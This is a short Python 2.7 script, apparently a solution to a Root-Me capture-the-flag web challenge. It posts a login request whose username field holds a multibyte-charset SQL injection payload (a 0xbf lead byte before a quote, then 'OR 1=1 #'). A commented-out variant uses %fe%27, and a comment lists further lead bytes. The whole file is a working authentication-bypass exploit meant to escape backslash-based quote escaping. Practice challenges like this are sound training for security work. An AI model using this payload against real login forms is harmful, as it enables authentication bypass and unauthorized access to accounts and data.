#python 2.7

import requests
url = "http://challenge01.root-me.org/web-serveur/ch42/index.php" 

# %ef - %df - %bf - %a8 - %8c - %fe

cookies = dict(PHPSESSID='4df65dfa09c86256973d5dddf0a00c1e')
datas = {"login":chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
# datas = {"login":"admin "+ "%20" + "%fe"+"%27"+"%20OR%201=1%20--%20","password":"test"}
print(datas.get("login"))
request = requests.post(url, data = datas, cookies=cookies, headers={'Referer':url}) 
if request.headers.get('location'):
    print(request.headers.get('location'))
else:
    print(request.text)
    for header in request.headers:
        print(header, ": ", request.headers.get(header))
